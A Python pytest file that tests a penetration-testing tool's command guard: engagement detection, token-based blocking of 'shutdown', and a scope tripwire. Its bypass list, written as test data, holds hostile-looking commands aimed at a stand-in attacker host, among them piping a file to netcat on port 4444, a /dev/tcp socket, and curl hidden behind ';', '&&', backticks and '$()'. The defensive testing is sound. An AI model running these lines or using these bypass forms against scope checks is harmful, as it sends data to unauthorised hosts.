"""Guard/tripwire hardening regressions.

Covers:
  A1 — guard is a no-op outside an engagement (no `.pentest-state/`), fail-closed inside it.
  A2 — BLOCKED_ALWAYS matches executables by token, not substring.
  A3 — the scope tripwire catches shell-operator, command-substitution, inline-code
        and /dev/tcp bypasses, and fails closed on a parse error.
Local destructive commands without any network tool are out of the tripwire's lane.
"""
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "engine"))

from guard import check_command  # noqa: E402
from policy import PolicyDenied, command_policy  # noqa: E402


def _make_engagement(root: Path) -> Path:
    state = root / ".pentest-state"
    state.mkdir()
    state.joinpath("scope.json").write_text(json.dumps({
        "authorization": "Authorized by operator for testing",
        "in_scope": [{"pattern": "target.example.com", "type": "domain", "notes": ""}],
        "out_of_scope": [],
        "rules": [],
    }))
    state.joinpath("window.json").write_text(json.dumps({
        "timezone": "UTC",
        "windows": [{"days": ["mon", "tue", "wed", "thu", "fri", "sat", "sun"],
                     "start": "00:00", "end": "23:59"}],
        "expires_at": "2099-12-31T23:59:59+00:00",
        "allow_override": False,
    }))
    return root


@pytest.fixture()
def engagement(tmp_path):
    return _make_engagement(tmp_path)


# --- A1: no-op outside an engagement ---------------------------------------

def test_noop_outside_engagement(tmp_path):
    """No `.pentest-state/` in the tree: the guard must not police the shell."""
    assert command_policy("curl https://pypi.org/simple/", tmp_path)["allowed"]
    assert command_policy("python3 -c 'print(1)'", tmp_path)["allowed"]
    assert check_command("shutdown -h now", audit_dir=str(tmp_path))["allowed"]


def test_engagement_without_scope_still_fails_closed(tmp_path):
    (tmp_path / ".pentest-state").mkdir()
    with pytest.raises(PolicyDenied):
        command_policy("curl https://target.example.com", tmp_path)


def test_engagement_detected_from_subdirectory(engagement):
    sub = engagement / "recon" / "nmap"
    sub.mkdir(parents=True)
    with pytest.raises(PolicyDenied):
        command_policy("curl https://evil.attacker.com", sub)


# --- A2: BLOCKED_ALWAYS by token, not substring ----------------------------

def test_grep_halting_allowed(engagement):
    assert check_command("grep -i halting app.log", audit_dir=str(engagement))["allowed"]


def test_shutdown_blocked_in_engagement(engagement):
    result = check_command("shutdown -h now", audit_dir=str(engagement))
    assert not result["allowed"]
    assert "shutdown" in result["blocked_reason"].lower()


# --- A3: tripwire catches the known bypasses -------------------------------

BYPASS_OUT_OF_SCOPE = [
    "nmap evil.attacker.com # it's fine",          # shlex ValueError → must fail closed
    "true;curl https://evil.attacker.com",         # ';' with no spaces
    "echo $(curl -s https://evil.attacker.com)",   # command substitution
    "echo `curl https://evil.attacker.com`",       # backticks
    "true&&curl https://evil.attacker.com",        # && with no spaces
    "true||curl https://evil.attacker.com",        # || with no spaces
    "cat x|nc evil.attacker.com 4444",             # pipe with no spaces
    "bash -lc 'curl https://evil.attacker.com'",   # inline shell code
]


@pytest.mark.parametrize("command", BYPASS_OUT_OF_SCOPE)
def test_bypass_out_of_scope_blocked(command, engagement):
    with pytest.raises(PolicyDenied):
        command_policy(command, engagement)


def test_dev_tcp_channel_forces_scope_check(engagement):
    with pytest.raises(PolicyDenied):
        command_policy("bash -c 'exec 3<>/dev/tcp/evil.attacker.com/80'", engagement)


def test_in_scope_bypass_still_allowed(engagement):
    assert command_policy("true;curl https://target.example.com", engagement)["allowed"]


# --- Local destructive commands are not the tripwire's job -----------------

def test_local_destructive_without_network_allowed(engagement):
    assert command_policy("rm -rf build", engagement)["allowed"]
    assert command_policy("git log --author john", engagement)["allowed"]
